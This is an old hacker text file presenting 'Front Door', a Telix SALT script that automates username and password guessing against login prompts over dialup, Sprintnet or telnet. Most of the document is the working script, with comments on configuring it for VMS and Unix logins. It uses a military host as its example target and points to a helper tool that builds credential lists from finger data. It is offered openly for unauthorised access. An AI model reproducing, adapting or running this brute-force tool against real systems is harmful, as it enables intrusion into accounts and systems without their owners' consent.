                   \\\______________________________///


There  are few  people that recognize  that there is an easy and extremely
powerful method of hacking, that you can use in lieu of manual brute force
techniques.  It can  be done  quite  simply with  the Telix SALT language,
which is included in every shareware package of the popular communications
software, "Telix". Although arguably not the best in communications on the
IBM platform,  Telix  does have a rather powerful scripting language  that
almost anyone can learn quickly,  and  efficiently.  Since  the  SALT will
handle  all  communication Input/Output, you need not worry about  looking
for  any serial  libraries  for your C compiler (or worse yet, writing the
serial I/O yourself.),  and you also won't have the annoying need to leave 
your  communications  package  for  its  execution;  the  SALT is executed
straight out of Telix. The following program is the most basic form of the 
password hacker.  It  basically looks for certain strings to pass over the 
modem,  and  then answers  their  inquiries by pulling lines from an ASCII 
text file.  Feel  completely  free to modify  the existing code to include 
menus  and prompts  (instead of hard-coded variables),  as well as support 
for hacking miscellaneous operating systems.  As is, the following program 
should take care of all your front door hacking needs... enjoy!

------------------------------- ( Cut Here ) -----------------------------------
main()
{
// 'Front Door' written by Erik Turbo
//
// Variable initialization:
// ===========================================
   int stat, t1, t2, t3, t4, t5;
   str pass[80], username[80], site_name[80];
   str default_file[80];
// ===========================================
//
//
fclose(default_file); // LEAVE this!  It closes the default_file  
                      // in case your previous hack terminated incorrectly
                      // prior to running this program.

// ------------------------( CONFIGURATION )----------------------------
//
// Variable Declaration - VERY Important!  Here, you have to change the   
// string values of the following 'track' variables, in order to 
// customize this program for the system you are trying to gain access to.
// The following is a listing of what the actual track variables denote:   
//
// t1 = The login prompt (ex: 'Enter your Name:', or what not.)
// t2 = The password prompt (ex: 'Enter your password:')
// t3 = The string that implies a connection has been closed (ex: NO CARRIER)   
// t4 = The string that denotes success. (ex: Access granted.)
// t5 = The string that indicates a login failure. Only necessary on machines
//      that force you to press enter after a failure, otherwise it is
//      meaningless and can be set to any value that will not conflict with
//      the others.
//   
// When hacking a dialup, set the t3 value to 'NO CARRIER'
// t3 = track("NO CARRIER", 0);
//
// When hacking from Sprintnet, set the t3 value to '@'
// t3 = track("@", 0);
//
// When hacking from the Internet, set the t3 value to 'closed'
// t3 = track("closed", 0);
//   
// Now that you have your 't3' variable configured for the network 
// connection, you now have to set the remaining track variables for
// the program to recognize what system you are hacking.
//    
// For VMS set the values as follows:
// t1 = track("Username: ", 0);   
// t2 = track("Password:", 0);
// t4 = track("Interactive", 0);  
// t5 = track("User authorization failure", 0);
//   
// For a Unix based machine, use the following:
// t1 = track("login:", 0);
// t2 = track("Password:", 0);
// t4 = track("Last login", 0);
// t5 = track(" ",0);
// 
// There are few more variables that have to be set, to configure the program
// to hack your system.
//
// The 'site_name' variable is the actual node name, or telephone number, of
// the system you wish to hack.  If you set your 't3' variable to indicate 
// you were hacking off the telephone network, than set the 'site_name' 
// variable to the telephone number you are going to hack.  If you are 
// hacking off the internet, or similar node-based network, than set it to 
// the address of the system you are hacking.
//
// Examples:
//
// site_name = "999-9999"
// site_name = "norad.navy.mil'
// site_name = "617034"
//
// Hacking Information File - Contains usernames and passwords to attempt.
//
// default_file = fopen("hack.dat", "r");
//
// The 'default_file' variable is the heart of this entire program.  The
// file that it points to, is the file that YOU HAVE TO create in order
// for this program to work!  In this example, the file it points to is
// 'hack.dat'.  'HACK.DAT' is an ASCII file that you must write, which
// contains all account information, as well as the passwords you wish
// to attempt using.  The format of the HACK.DAT ascii file is as follows:
//
// ACCOUNT1
// PASSWORD1
// ACCOUNT1
// PASSWORD2
// ACCOUNT1
// PASSWORD3
// ACCOUNT2
// PASSWORD1
//
// ... and so on, and so forth.  You may have as many combinations of
// accounts and passwords as you like -- it is not limited by size.
// You, however, MUST use that format, since the program reads that data
// file sequentially, and will not know the difference between a username
// and a password. (obviously. hehe...) 
//   



hack:

cputs("telnet "); // CHANGE this to suit your needs. It will usually be set 
                  // to one of the following values depending on how you are
                  // hacking:
                  // cputs("telnet "); if you are hacking the Internet
                  // cputs("ATDT "); if you are hacking a dialup
                  // cputs("C "); if you are hacking Sprintet, or a Decserver.

cputs(site_name); // This should have already been set to the address name or 
                  // telephone number of the system you are hacking.

cputs("^M");      // Presses ENTER for you, after it sends the strings.
  
while (1)         // Begins an indefinitive loop.
{
terminal();       // Allows for two-way communication between you and the 
                  // remote system.

stat = track_hit(0); // Starts checking for the track variables to appear
                     // over the modem.

if (stat == t1)
   {
   fgets(username, 80, default_file);
   cputs(username);
   cputs("^M");
   }
   // Gets a line from HACK.DAT and sends it over the modem, pressing enter
   // when complete.  This string SHOULD be the username if you entered the
   // information in HACK.DAT correctly.
   
if (stat == t2) 
   {
   fgets(pass, 80, default_file);
   cputs(pass);
   cputs("^M");
   prints(pass);
   }
   // Gets a line from HACK.DAT and sends it over the modem, pressing enter
   // when complete.  This string SHOULD be the password if you entered the
   // information in HACK.DAT correctly.

if (stat == t3)
   goto hack;
   // That username and password did not work, so the program goes back 
   // through the loop again.

if (stat == t4)
   {
   printc(7);
   printc(7);
   printc(7);
   }
   // You got in!  Three beeps from your speaker will lure you to your
   // terminal if you are away.

if (stat == t5)
   cputs("^M");
   // Necessary only on VMS systems and similar machines that require you
   // to press ENTER after a failed login attempt.

}
}

Also - For a great program to be used with 'Front Door', download PASS.EXE
       from Black ICE Consortium. (located in the /bin directory)
       This program will create HACK.DAT ASCII files for you, and even
       modify TCP/IP 'finger' files to be used by the HACK.DAT format.
